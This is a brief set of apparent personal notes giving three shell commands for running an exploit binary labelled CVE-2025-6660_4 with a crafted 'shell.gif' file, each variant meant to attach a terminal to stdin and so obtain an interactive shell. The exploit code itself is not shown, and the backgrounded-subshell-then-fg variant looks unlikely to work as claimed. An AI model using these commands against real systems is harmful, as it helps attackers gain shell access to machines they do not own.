# Reads from stdin, gives TTY to vuln binary
```
cat - | ./CVE-2025-6660_4 shell.gif ↑ stdin gets TTY 
```

# Force TTY on stdin/stdout
```
./CVE-2025-6660_4 shell.gif < /dev/tty #TTY stdin
```

# Background vuln, fg with TTY
```
(./CVE-2025-6660_4 shell.gif < /dev/tty & ) && fg
```